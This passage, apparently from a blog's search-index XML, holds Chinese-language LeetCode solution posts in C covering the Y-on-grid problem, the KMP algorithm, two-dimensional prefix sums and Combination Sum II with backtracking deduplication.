(*returnColumnSizes)[i] = length[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在矩阵上写出字母Y所需的最少操作次数</title>
    <link href="/2024/03/03/%E5%9C%A8%E7%9F%A9%E9%98%B5%E4%B8%8A%E5%86%99%E5%87%BA%E5%AD%97%E6%AF%8DY/"/>
    <url>/2024/03/03/%E5%9C%A8%E7%9F%A9%E9%98%B5%E4%B8%8A%E5%86%99%E5%87%BA%E5%AD%97%E6%AF%8DY/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/minimum-operations-to-write-the-letter-y-on-a-grid/</p><p>这题是第 387场力扣周赛第三题。我一开始的思路是分开计算<strong>“Y”所占方格位置中0、1、2 的个数</strong>和<strong>其他格子中 0、1、2的个数</strong>，但是有点繁琐，看了题解后得知一共只有六种情况（0-1，0-2，1-0，1-2，2-0，2-1），可以直接枚举所有情况，然后取最小值。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isY</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> gridSize)</span> { <span class="comment">//判断（i，j）是否处于Y的范围内</span></span><br><span class="line">    <span class="keyword">if</span>(i==j &amp;&amp; i&lt;gridSize/<span class="number">2</span>)    <span class="comment">//Y的左斜分支</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i+j == gridSize<span class="number">-1</span> &amp;&amp; i&lt;gridSize/<span class="number">2</span>) <span class="comment">//Y的右斜分支</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=gridSize/<span class="number">2</span> &amp;&amp; j==gridSize/<span class="number">2</span>) <span class="comment">//Y的垂直部分</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span>** grid, <span class="type">int</span> gridSize, <span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;gridSize; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;gridSize; j++) {</span><br><span class="line">            <span class="keyword">if</span>(isY(i, j, gridSize)==<span class="number">0</span> &amp;&amp; grid[i][j]!=x) {</span><br><span class="line">                count++; <span class="comment">//需要修改，则计数加1</span></span><br><span class="line">     <span class="comment">//注意 grid[i][j]不需要真的修改，因为这样会导致原数组变化，从而导致后面的结果不正确</span></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(isY(i,j,gridSize)==<span class="number">-1</span> &amp;&amp; grid[i][j]!=y) {</span><br><span class="line">                count++;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">minimumOperationsToWriteY</span><span class="params">(<span class="type">int</span>** grid, <span class="type">int</span> gridSize, <span class="type">int</span>* gridColSize)</span> {</span><br><span class="line">    <span class="type">int</span> count[<span class="number">6</span>]; <span class="comment">//保存枚举结果</span></span><br><span class="line">    <span class="type">int</span> top = <span class="number">0</span>; <span class="comment">//count数组下标</span></span><br><span class="line">    <span class="built_in">memset</span>(count, <span class="number">0</span>, <span class="keyword">sizeof</span>(count));</span><br><span class="line">    <span class="type">int</span> min = INT_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> x=<span class="number">0</span>; x&lt;<span class="number">3</span>; x++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>; y&lt;<span class="number">3</span>; y++) {</span><br><span class="line">            <span class="keyword">if</span>(x!=y)</span><br><span class="line">                count[top++] = change(grid, gridSize, x, y);</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;top; i++) {</span><br><span class="line">        <span class="keyword">if</span>(min&gt;count[i])</span><br><span class="line">            min = count[i];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>找出字符串中第一个匹配项的下标</title>
    <link href="/2024/03/03/KMP%E7%AE%97%E6%B3%95/"/>
    <url>/2024/03/03/KMP%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/</p><p>先介绍KMP算法</p><h2 id="kmp算法">KMP算法</h2><p>参考：https://www.zhihu.com/question/21923021</p><h3 id="原理">原理</h3><ul><li><p>时间复杂度：O(n+m)</p></li><li><p><strong>主串不回退</strong></p></li><li><p>前缀：除最后一个字符之外的头部子串</p></li><li><p>后缀：除第一个字符之外的尾部子串</p></li><li><p>部分匹配值（PM）：<strong>最长相等前后缀长度</strong></p></li><li><p>遇到不匹配的字符时：<strong>移动位数（从当前位置向左移动） =已匹配的字符数 -已匹配的部分匹配值(不匹配前一位的对应前缀表中的值)</strong></p><blockquote><p>模式串指针指向新的位置即<code>pos = 前缀表[pos-1]</code></p><p><strong>前缀表[pos-1]</strong>就是<strong>已匹配的部分匹配值</strong></p></blockquote></li><li><p>next数组：即当前元素对应的该元素<strong>前面的子串</strong>的<strong>部分匹配值</strong>,<strong>若当前元素P[2]与主串不匹配，则模式串的指针跳转到P[next[2-1]]（即P[1]）</strong></p><p><img src="https://code-thinking.cdn.bcebos.com/pics/KMP%E7%B2%BE%E8%AE%B28.png"></p><blockquote><p>注意这篇文章的<strong>前提</strong>：<strong>前缀表就是next数组</strong></p><p>还有其他的表示方法，如下（本文不讨论下面的情况）：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202403031013047.png"></p></blockquote></li></ul><h3 id="构造next数组">构造next数组：</h3><ul><li><p>设模式串为<strong>P</strong>，假设 next[0], next[1], ...next[x-1] 均已知，求 next[x]</p></li><li><p>即此时已遍历到模式串 P[x]元素，需要比较已匹配前缀的后一个字符<strong>P[now]</strong>与<strong>P[x]</strong>是否相同：(next[x-1]= now)</p><ol type="1"><li>若 P[now] = P[x] ，则 <strong>next[x] = next[x-1] + 1</strong></li></ol><p><img src="https://picx.zhimg.com/v2-6d6a40331cd9e44bfccd27ac5a764618_r.jpg?source=1def8aca"></p><ol start="2" type="1"><li>若 P[now] != P[x] ，则需要缩小 now(即回退已匹配前缀)，now应该改成——使得<strong>A的k-前缀</strong>等于<strong>B的k-后缀</strong>的最大的k，而<strong>B的后缀等于A的后缀</strong>（因为A、B是相等的子串），所以只需找到A的k-前缀等于A的k-后缀的最大的k即<strong>A的最长公共前后缀的长度</strong>，也就是<strong>next[now-1]</strong></li></ol><p><img src="https://picx.zhimg.com/v2-c5ff4faaab9c3e13690deb86d8d17d71_r.jpg?source=1def8aca"></p><ol start="3" type="1"><li>更新 now ：now = next[now-1] ，然后继续比较 P[now] 和 P[x]</li></ol></li><li><p>代码实现</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>* next, <span class="type">char</span>* P)</span> {</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//初始化next数组</span></span><br><span class="line">    <span class="type">int</span> now = <span class="number">0</span>; <span class="comment">//开始比较时，模式串下标</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="built_in">strlen</span>(P); ) {</span><br><span class="line">        <span class="keyword">if</span>(P[now] == P[i]) { <span class="comment">//若相等，则更新next数组</span></span><br><span class="line">            now+=<span class="number">1</span>;</span><br><span class="line">            next[i] = now;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(now!=<span class="number">0</span>) <span class="comment">//若不相等，且now不为0，则回退now</span></span><br><span class="line">            now = next[now<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">else</span> { <span class="comment">//若now等于0，即模式串第一个字符与第二个字符不相等，则更新next[i]=0</span></span><br><span class="line">            next[i] = <span class="number">0</span>;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><p>注：只有next数组更新后（即next[i]不为空），下标i才能增加；否则继续修改now值，然后比较P[now]与P[i]，直到next数组更新</p><h2 id="题目代码">题目代码</h2><p>注：当<strong>主串第一个字符</strong>与<strong>模式串第一个字符</strong>不匹配时，只需<strong>移动主串指针</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>* next, <span class="type">char</span>* P)</span> {</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//初始化next数组</span></span><br><span class="line">    <span class="type">int</span> now = <span class="number">0</span>; <span class="comment">//开始比较时，模式串下标</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="built_in">strlen</span>(P); ) {</span><br><span class="line">        <span class="keyword">if</span>(P[now] == P[i]) {</span><br><span class="line">            now+=<span class="number">1</span>;</span><br><span class="line">            next[i] = now;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(now!=<span class="number">0</span>)</span><br><span class="line">            now = next[now<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            next[i] = <span class="number">0</span>;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strStr</span><span class="params">(<span class="type">char</span>* haystack, <span class="type">char</span>* needle)</span> {</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">strlen</span>(needle);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> next[length];</span><br><span class="line">    getNext(next, needle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(haystack); ) {</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(haystack[i] == needle[j]) {  <span class="comment">//比较主串与模式串的字符</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        } <span class="comment">//若相等则同时增加下标</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j != <span class="number">0</span>) <span class="comment">//若不相等，且模式串下标不为0，则更新模式串下标j</span></span><br><span class="line">            j = next[j<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">else</span>  <span class="comment">//若不相等且模式串下标为0，则只改变主串下标</span></span><br><span class="line">            i++;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(j==length) <span class="comment">//如果模式串遍历结束</span></span><br><span class="line">            <span class="keyword">return</span> i-j; <span class="comment">//返回第一个匹配项的下标</span></span><br><span class="line">    } </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
      <category>KMP算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维前缀和</title>
    <link href="/2024/03/03/%E4%BA%8C%E7%BB%B4%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    <url>/2024/03/03/%E4%BA%8C%E7%BB%B4%E5%89%8D%E7%BC%80%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>第 387场力扣周赛第二题：https://leetcode.cn/contest/weekly-contest-387/problems/count-submatrices-with-top-left-element-and-sum-less-than-k/</p><h2 id="一维数组前缀和">一维数组前缀和</h2><p>给定数组<strong>nums</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nums[<span class="number">5</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>}</span><br></pre></td></tr></tbody></table></figure><p>则该数组前缀和数组为</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">presum[<span class="number">5</span>] = { <span class="number">1</span>, <span class="number">1</span> + <span class="number">2</span>, <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span>, <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span> + <span class="number">4</span>, <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span> + <span class="number">4</span> + <span class="number">5</span>}</span><br></pre></td></tr></tbody></table></figure><p>即<code>presum[5] = {1, 3, 6, 10, 15}</code></p><h2 id="二维数组前缀和">二维数组前缀和</h2><p>类比一维数组前缀和是子数组元素之和，二维数组前缀和表示的是一个子矩阵的元素之和，如下图所示(没有列出所有情况)：</p><p><img src="https://assets.leetcode.com/uploads/2024/01/01/example1.png"></p><p>下面是计算前缀和数组的步骤：</p><ul><li><p>首先定义一个二维数组<code>presum</code></p></li><li><p><code>presum[i][j]</code>等于<strong>上方</strong>前缀和加上<strong>左方</strong>前缀和，最后需要减去<strong>左上方</strong>前缀和，因为前面的加法中包含了两个左上方矩阵的前缀和，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202403031410735.png"></p><p>列出的式子如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">presum[i][j] = presum[i<span class="number">-1</span>][j] + presum[i][j<span class="number">-1</span>] + nums[i<span class="number">-1</span>][j<span class="number">-1</span>] - presum[i<span class="number">-1</span>][j<span class="number">-1</span>]</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>presum</code>数组下标从1开始比较方便，不需要考虑边界值，因此<code>presum</code>数组比原数组多一行一列</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">countSubmatrices</span><span class="params">(<span class="type">int</span>** grid, <span class="type">int</span> gridSize, <span class="type">int</span>* gridColSize, <span class="type">int</span> k)</span> {</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; </span><br><span class="line">    <span class="type">int</span> presum[gridSize+<span class="number">1</span>][gridColSize[<span class="number">0</span>]+<span class="number">1</span>]; <span class="comment">//注意presum数组大小</span></span><br><span class="line">    <span class="built_in">memset</span>(presum, <span class="number">0</span>, <span class="keyword">sizeof</span>(presum)); <span class="comment">//初始化为0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=gridSize; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=gridColSize[<span class="number">0</span>]; j++) {</span><br><span class="line">            presum[i][j] = presum[i<span class="number">-1</span>][j] + presum[i][j<span class="number">-1</span>] + grid[i<span class="number">-1</span>][j<span class="number">-1</span>] - presum[i<span class="number">-1</span>][j<span class="number">-1</span>]; <span class="comment">//无需考虑边界值</span></span><br><span class="line">            <span class="keyword">if</span>(presum[i][j]&lt;=k)</span><br><span class="line">                count++;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>组合总和Ⅱ</title>
    <link href="/2024/03/02/%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C%E2%85%A1/"/>
    <url>/2024/03/02/%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C%E2%85%A1/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/combination-sum-ii/</p><p>这题与<a href="https://leetcode.cn/problems/combination-sum/">组合总和</a>类似，主要的不同是这题提供的数组中包含重复元素，因此我先对原数组进行排序，然后直接使用上一题的方法，结果报错，因为出现了<strong>重复组合</strong>。这题的难点就在于<strong>去重</strong>。</p><p>根据代码随想录，去重分为<strong>树层去重</strong>和<strong>树枝去重</strong>。而这题需要进行<strong>树层去重</strong>，树枝可以出现重复元素，如下图所示(来源为代码随想录)：</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20230310000954.png"></p><p>这里使用了一个数组<code>used</code>来表示当前元素是否处于树枝中（或路径中）</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = index; i &lt; candidatesSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; candidates[i<span class="number">-1</span>]==candidates[i]&amp;&amp;used[i<span class="number">-1</span>]==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//将当前数字大小加入sum</span></span><br><span class="line">        sum+=candidates[i];</span><br><span class="line">        path[pathTop++] = candidates[i];</span><br><span class="line">        used[i]=<span class="number">1</span>;</span><br><span class="line">        backTracking(target, i+<span class="number">1</span>, candidates, candidatesSize, sum, used);</span><br><span class="line">        sum-=candidates[i];</span><br><span class="line">        used[i]=<span class="number">0</span>; <span class="comment">//回溯，说明同一树层中该元素已被遍历过</span></span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>当令<code>used[i]=0</code>时，说明程序已经回溯到该元素所在层，下一步就是遍历与该元素处于同一层的元素，首先<code>i++</code>，然后判断当前元素与上一个元素<strong>是否相同</strong>、<strong>是否处于同一层</strong>，由此判断是否跳过该元素。</p><p>完整代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* path;</span><br><span class="line"><span class="type">int</span> pathTop;</span><br><span class="line"><span class="type">int</span>** ans;</span><br><span class="line"><span class="type">int</span> ansTop;</span><br><span class="line"><span class="comment">//记录每一个和等于target的path数组长度</span></span><br><span class="line"><span class="type">int</span>* length;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backTracking</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span> index, <span class="type">int</span>* candidates, <span class="type">int</span> candidatesSize, <span class="type">int</span> sum, <span class="type">int</span>* used)</span> {</span><br><span class="line">    <span class="comment">//若sum&gt;=target就应该终止遍历</span></span><br><span class="line">    <span class="keyword">if</span>(sum &gt;= target) {</span><br><span class="line">        <span class="comment">//若sum等于target，将当前的组合放入ans数组中</span></span><br><span class="line">        <span class="keyword">if</span>(sum == target) {</span><br><span class="line">            <span class="type">int</span>* tempPath = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * pathTop);</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pathTop; j++) {</span><br><span class="line">                tempPath[j] = path[j];</span><br><span class="line">            }</span><br><span class="line">            ans[ansTop] = tempPath;</span><br><span class="line">            length[ansTop++] = pathTop;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = index; i &lt; candidatesSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; candidates[i<span class="number">-1</span>]==candidates[i]&amp;&amp;used[i<span class="number">-1</span>]==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//将当前数字大小加入sum</span></span><br><span class="line">        sum+=candidates[i];</span><br><span class="line">        path[pathTop++] = candidates[i];</span><br><span class="line">        used[i]=<span class="number">1</span>;</span><br><span class="line">        backTracking(target, i+<span class="number">1</span>, candidates, candidatesSize, sum, used);</span><br><span class="line">        sum-=candidates[i];</span><br><span class="line">        used[i]=<span class="number">0</span>; <span class="comment">//回溯，说明同一树层中该元素已被遍历过</span></span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>* candidates, <span class="type">int</span> candidatesSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="comment">//初始化变量</span></span><br><span class="line">    path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">50</span>);</span><br><span class="line">    ans = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*) * <span class="number">200</span>);</span><br><span class="line">    length = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">200</span>);</span><br><span class="line">    ansTop = pathTop = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>* used = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*candidatesSize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;candidatesSize; i++)</span><br><span class="line">        used[i] = <span class="number">0</span>; <span class="comment">//初始化</span></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;candidatesSize<span class="number">-1</span>; i++) <span class="comment">//冒泡排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;candidatesSize-i<span class="number">-1</span>; j++) {</span><br><span class="line">            <span class="keyword">if</span>(candidates[j]&gt;candidates[j+<span class="number">1</span>]) {</span><br><span class="line">                tmp = candidates[j+<span class="number">1</span>];</span><br><span class="line">                candidates[j+<span class="number">1</span>] = candidates[j];</span><br><span class="line">                candidates[j] = tmp;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    backTracking(target, <span class="number">0</span>, candidates, candidatesSize, <span class="number">0</span>, used);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置返回的数组大小</span></span><br><span class="line">    *returnSize = ansTop;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * ansTop);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; ansTop; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = length[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电话号码的字母组合</title>
